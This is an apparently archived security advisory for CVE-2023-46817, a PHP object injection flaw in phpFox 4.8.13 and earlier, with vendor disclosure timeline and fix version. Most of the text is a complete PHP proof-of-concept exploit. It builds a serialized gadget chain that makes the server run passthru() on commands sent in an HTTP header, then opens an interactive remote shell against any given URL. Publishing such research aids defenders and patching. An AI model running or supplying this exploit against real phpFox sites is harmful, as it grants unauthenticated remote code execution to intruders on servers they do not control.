@@ -1,0 +1,165 @@
+id: 39132
+date: 10/30/2023
+title: phpFox 4.8.13 PHP Object Injection Exploit
+author: EgiX
+cves: CVE-2023-46817
+
+--------------------------------------------------------------
+phpFox <= 4.8.13 (redirect) PHP Object Injection Vulnerability
+--------------------------------------------------------------
+
+
+[-] Software Link:
+
+https://www.phpfox.com
+
+
+[-] Affected Versions:
+
+Version 4.8.13 and prior versions.
+
+
+[-] Vulnerability Description:
+
+User input passed through the "url" request parameter to the 
+/core/redirect route is not properly sanitized before being used in a 
+call to the unserialize() PHP function. This can be exploited by remote, 
+unauthenticated attackers to inject arbitrary PHP objects into the 
+application scope, allowing them to perform a variety of attacks, such 
+as executing arbitrary PHP code.
+
+
+[-] Proof of Concept:
+
+https://karmainsecurity.com/pocs/CVE-2023-46817.php
+
+(Packet Storm note: POC included at bottom)
+
+
+[-] Solution:
+
+Upgrade to version 4.8.14 or later.
+
+
+[-] Disclosure Timeline:
+
+[05/10/2023] - Vendor contacted through https://clients.phpfox.com
+[05/10/2023] - Vendor response stating "we currently do not have such 
+security requirements"
+[06/10/2023] - CVE identifier requested
+[09/10/2023] - Vulnerability details shared with the vendor, stating the 
+issue is quite critical
+[17/10/2023] - Vendor contacted again, asking for an update
+[18/10/2023] - Vendor response stating "this issue is fixed in our 
+latest version (4.8.13)", but that's not the truth
+[26/10/2023] - Version 4.8.14 released
+[27/10/2023] - CVE identifier assigned
+[27/10/2023] - Public disclosure
+
+
+[-] CVE Reference:
+
+The Common Vulnerabilities and Exposures project (cve.mitre.org)
+has assigned the name CVE-2023-46817 to this vulnerability.
+
+
+[-] Credits:
+
+Vulnerability discovered by Egidio Romano.
+
+
+[-] Original Advisory:
+
+https://karmainsecurity.com/KIS-2023-12
+
+
+[-] Other References:
+
+https://docs.phpfox.com/display/FOX4MAN/phpFox+4.8.14
+
+
+---  CVE-2023-46817.php poc ---
+
+<?php
+
+/*
+    --------------------------------------------------------------
+    phpFox <= 4.8.13 (redirect) PHP Object Injection Vulnerability
+    --------------------------------------------------------------
+
+    author..............: Egidio Romano aka EgiX
+    mail................: n0b0d13s[at]gmail[dot]com
+    software link.......: https://www.phpfox.com
+
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+
+    [-] Vulnerability Description:
+
+    User input passed through the "url" request parameter to the /core/redirect route is
+    not properly sanitized before being used in a call to the unserialize() PHP function.
+    This can be exploited by remote, unauthenticated attackers to inject arbitrary PHP
+    objects into the application scope, allowing them to perform a variety of attacks,
+    such as executing arbitrary PHP code.
+
+    [-] Original Advisory:
+
+    https://karmainsecurity.com/KIS-2023-12
+*/
+
+set_time_limit(0);
+error_reporting(E_ERROR);
+
+if (!extension_loaded("curl")) die("[+] cURL extension required!\n");
+
+print "+------------------------------------------------------------------+\n";
+print "| phpFox <= 4.8.13 (redirect) PHP Object Injection Exploit by EgiX |\n";
+print "+------------------------------------------------------------------+\n";
+
+if ($argc != 2) die("\nUsage: php $argv[0] <URL>\n\n");
+
+function encode($string)
+{
+        $string = addslashes(gzcompress($string, 9));
+        return urlencode(strtr(base64_encode($string), '+/=', '-_,'));
+}
+
+class Phpfox_Request
+{
+  private $_sName = "EgiX";
+  private $_sPluginRequestGet = "print '_____'; passthru(base64_decode(\$_SERVER['HTTP_CMD'])); print '_____'; die;";
+}
+
+class Core_Objectify
+{
+  private $__toString;
+
+  function __construct($callback)
+  {
+    $this->__toString = $callback;
+  }
+}
+
+print "\n[+] Launching shell on {$argv[1]}\n";
+
+$popChain = serialize(new Core_Objectify([new Phpfox_Request, "get"]));
+$popChain = str_replace('Core_Objectify', 'Core\Objectify', $popChain);
+
+$ch = curl_init();
+
+curl_setopt($ch, CURLOPT_URL, "{$argv[1]}index.php/core/redirect");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "url=".encode($popChain));
+
+while(1)
+{
+    print "\nphpFox-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ["CMD: ".base64_encode($cmd)]);
+    preg_match("/_____(.*)_____/s", curl_exec($ch), $m) ? print $m[1] : die("\n[+] Exploit failed!\n");
+}
+
+#  0day.today [2023-11-03]  #
